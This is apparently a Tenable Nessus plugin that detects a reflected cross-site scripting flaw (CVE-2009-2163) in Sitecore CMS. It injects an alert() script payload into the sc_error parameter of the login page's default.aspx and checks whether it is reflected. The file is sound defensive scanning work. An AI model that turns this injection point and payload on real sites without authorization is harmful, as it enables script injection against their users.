#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(55977);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/02/08 22:04:50 $");

  script_bugtraq_id(44405);
  script_osvdb_id(54916);
  script_cve_id("CVE-2009-2163");

  script_name(english:"Sitecore CMS 'default.aspx' XSS");
  script_summary(english:"Attempts to exploit a cross-site scripting vulnerability in Sitecore.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by a
cross-site scripting vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Sitecore CMS that is
reportedly affected by a cross-site scripting vulnerability. An
attacker could exploit this to inject arbitrary HTML or script code
into a user's browser to be executed within the security context of
the affected site." );
  # http://sdn.sitecore.net/SDN5/Products/Sitecore%20V5/Sitecore%20CMS%206/Update/6_0_2_rev_090507.aspx
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b3044188");

  # http://forum.intern0t.net/intern0t-advisories/1082-sitecore-net-6-0-0-cross-site-scripting-vulnerability.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b614d96a");

  script_set_attribute(attribute:"solution", value:
"Upgrade to Sitecore 6.0.2 rev.090507, also known as 6.0.2 Update-1, or newer." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(79);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/06/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/05/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/08/25");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:sitecore:cms");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2017 Tenable Network Security, Inc.");

  script_dependencies("sitecore_cms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/sitecore_cms");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, embedded: 0);
install = get_install_from_kb(appname:'sitecore_cms', port:port, exit_on_fail:TRUE);

dir  = install['dir'] + '/login';
cgi  = '/default.aspx';
xss  = "<script>alert(/"+SCRIPT_NAME+"/)</script>";
pass_re = str_replace(string:xss, find:"(", replace:"\(");
pass_re = str_replace(string:pass_re, find:")", replace:"\)");
qs   = 'sc_error=' + xss;

# Injected script shows up in two places
# on the page. The first is safely escaped
# and the second is the actual unsafe xss.
# The pass2_re below is for further verification
# that we're looking at the proper page - it
# is not detecting the unsafe xss.
pass2_re  = '<form +name="LoginForm" +method="post" action=.*default\\.aspx\\?sc_error=.*alert.*'+SCRIPT_NAME;

exploited = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : cgi,
  qs       : qs,
  pass_re  : pass_re,
  pass2_re : pass2_re,
  # Added to keep test_cgi_xss()
  # from reporting incorrect
  # context area.
  ctrl_re  : pass_re
);

if (!exploited)
  exit(0, build_url(qs:dir+cgi, port:port) + " is not affected.");
